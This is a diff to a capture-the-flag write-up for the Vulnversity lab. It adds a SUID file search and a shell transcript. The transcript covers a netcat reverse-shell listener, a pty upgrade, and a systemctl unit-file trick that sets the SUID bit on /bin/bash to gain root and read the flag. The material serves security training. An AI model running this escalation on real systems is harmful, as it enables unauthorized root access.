@@ -95,7 +95,7 @@ cat phpext.txt
 .phtml
 ```
 
-Run this attack, what extension is allowed?
+Run this attack, what extension is allowed? .phtml
 
 
 https://github.com/regtay/Vulnversity/blob/main/Images/Burpsuite%20View%20.png
@@ -132,5 +132,87 @@ $
 #### Privilege Escalation
 
 On the system, search for all SUID files. What file stands out?
+```
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/bash
+/bin/ping
+/bin/fusermount
+/tmp/systemctl
+/sbin/mount.cifs
+```
 
-systemctl
+```
+nc -lvp 9001
+listening on [any] 9001 ...
+10.10.246.53: inverse host lookup failed: Unknown host
+connect to [10.9.239.22] from (UNKNOWN) [10.10.246.53] 41736
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 13:10:29 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c "import pty; pty.spawn('/bin/bash')"
+www-data@vulnuniversity:/$ TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+TF=$(mktemp).service
+www-data@vulnuniversity:/$ echo '[Service]
+ Type=oneshot
+ ExecStart=/bin/sh -c "chmod +s /bin/bash"
+ [Install]
+ WantedBy=multi-user.target' > $TF
+www-data@vulnuniversity:/$ /bin/systemctl link $TF
+Created symlink from /etc/systemd/system/tmp.eoRJBKjagh.service to /tmp/tmp.eoRJBKjagh.service.
+www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.eoRJBKjagh.service to /tmp/tmp.eoRJBKjagh.service.
+www-data@vulnuniversity:/$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+www-data@vulnuniversity:/$ /bin/bash/bin/bash
+bash-4.3$ cd root
+cd root
+bash: cd: root: Permission denied
+bash-4.3$ exit
+www-data@vulnuniversity:/$ /bin/bash -p
+/bin/bash -p
+bash-4.3# cd /root
+cd /root
+bash-4.3# ls
+ls
+root.txt
+bash-4.3# cat root
+cat root
+cat: root: No such file or directory
+bash-4.3# cat root.txt  
+cat root.txt
+a58ff8579f0a92----------966c7fd5
+bash-4.3#
+```
